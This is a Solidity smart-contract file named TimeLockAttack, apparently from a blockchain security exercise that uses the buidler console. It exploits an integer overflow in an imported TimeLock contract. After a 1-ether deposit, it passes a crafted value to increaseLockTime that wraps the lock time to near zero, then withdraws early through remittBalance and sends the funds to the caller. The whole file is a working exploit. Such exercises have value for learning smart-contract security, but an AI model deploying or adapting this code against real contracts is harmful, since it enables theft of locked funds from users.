// SPDX-License-Identifier: MIT
// pragma solidity ^0.5.1;
pragma solidity ^0.6.0;

import "./TimeLock.sol";
import "@nomiclabs/buidler/console.sol";

contract TimeLockAttack {

    TimeLock private timeLock;

    // intialise the timeLock variable with the contract address
    constructor(address payable _timeLockAddress) public {
        timeLock = TimeLock(_timeLockAddress);
        console.log("Info@TimeLockAttack.sol::constructor ContBal(%s)", address(this).balance );
    }

    function pwnTimeLock() public payable {

        console.log("Info@TimeLockAttack.sol::pwnTimeLock Sender(%s)", msg.sender );
        console.log("Info@TimeLockAttack.sol::pwnTimeLock Val(%s)", msg.value );
        console.log("Info@TimeLockAttack.sol::pwnTimeLock ContBal(%s)", address(this).balance );

        // attack to the nearest ether
        require(msg.value >= 1 ether);

        // send eth to the deposit() function
        timeLock.deposit.value(1 ether)();
        // timeLock.deposit{value: 1 ether}();

        // (bool success, ) = address(timeLock).call{value: 1 ether}("");
        // require(success, "Transfer failed.");

        console.log("Info@TimeLockAttack.sol::pwnTimeLock ContBal(%s)", address(this).balance );

        console.log("Info@TimeLockAttack.sol::pwnTimeLock L1 timelock(%s)", timeLock.lockTime(address(this)) );

        // timeLock.increaseLockTime( type(uint256).max - ( timeLock.lockTime(address(this)) - 1 ) );

        timeLock.increaseLockTime( ( 2**256 - 1 ) - ( timeLock.lockTime(address(this)) - 1 ) );

        console.log("Info@TimeLockAttack.sol::pwnTimeLock L2 timelock(%s)", timeLock.lockTime(address(this)) );

        timeLock.remittBalance();

        console.log("Info@TimeLockAttack.sol::pwnTimeLock ContBal(%s)", address(this).balance );

    }

    receive() external payable {

        require(msg.data.length == 0);

        console.log("Info@TimeLockAttack.sol::receive ContBal(%s)", address(this).balance );
    }

    function withdrawEth() public {
        msg.sender.transfer( address(this).balance );
    }

}
